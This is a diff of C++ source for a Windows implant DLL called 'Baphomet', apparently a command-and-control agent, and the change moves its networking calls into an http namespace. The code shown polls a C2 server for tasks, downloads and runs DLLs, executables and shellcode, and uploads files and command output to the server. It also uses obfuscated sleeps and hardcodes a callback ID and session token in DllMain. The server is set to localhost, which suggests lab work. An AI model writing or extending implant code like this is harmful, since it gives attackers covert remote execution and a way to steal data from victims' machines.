@@ -2,7 +2,6 @@
 #pragma comment(lib,"winhttp.lib")
 
 #define BAPHOMET_DEBUG
-
 #ifdef BAPHOMET_DEBUG
     #include <iostream>
 #endif
@@ -152,7 +151,7 @@ process_command(
         obfus::sleep(ctx.sleep_time);
         std::string dll_file;
 
-        if(!networking::recieve_file(
+        if(!networking::http::recieve_file(
             ctx.hconnect,
             ctx.callback_object,
             args[1],
@@ -179,7 +178,7 @@ process_command(
         obfus::sleep(ctx.sleep_time);
         std::string exe_file;
 
-        if(!networking::recieve_file(
+        if(!networking::http::recieve_file(
             ctx.hconnect,
             ctx.callback_object,
             args[1],
@@ -206,7 +205,7 @@ process_command(
         obfus::sleep(ctx.sleep_time);
         std::string shellcode_buff;
 
-        if(!networking::recieve_file(
+        if(!networking::http::recieve_file(
             ctx.hconnect,
             ctx.callback_object,
             args[1],
@@ -250,11 +249,11 @@ recieve_commands(implant_context& ctx) {
         }
     });
 
-    if(!networking::open_session(ctx.hsession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
+    if(!networking::http::open_session(ctx.hsession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
         return false;
     }
 
-    if(!networking::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, ctx.hsession, ctx.hconnect)) {
+    if(!networking::http::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, ctx.hsession, ctx.hconnect)) {
         return false;
     }
 
@@ -262,7 +261,7 @@ recieve_commands(implant_context& ctx) {
         obfus::sleep(ctx.sleep_time);
 
         task.clear();
-        if(!networking::send_object_message(
+        if(!networking::http::send_object_message(
             ctx.hconnect,
             ctx.callback_object,
             "get_task",
@@ -295,7 +294,7 @@ recieve_commands(implant_context& ctx) {
                 std::cout << "[+] Sending response:\n" << txt_output << std::endl;
             #endif
 
-            success = networking::send_object_message(
+            success = networking::http::send_object_message(
                 ctx.hconnect,
                 ctx.callback_object,
                 "complete_task --result " + txt_output,
@@ -306,7 +305,7 @@ recieve_commands(implant_context& ctx) {
         }
 
         if(type == output_type::FILE) {
-            success = networking::upload_file(
+            success = networking::http::upload_file(
                 ctx.hconnect,
                 ctx.callback_object,
                 file_to_upload,
@@ -342,7 +341,7 @@ BOOL APIENTRY DllMain(
 
     implant_context ctx;
     ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
-    ctx.session_token = "NjR2QnZ5dEY1QmRScUoybE9odEpzd0ZFTw==";
+    ctx.session_token = "UFlxaWk3TWlSWkJQQ2t0SW5Ga2h5VEQ5SQ==";
     ctx.server_addr = "127.0.0.1";
     ctx.port = 8081;
     ctx.is_https = false;
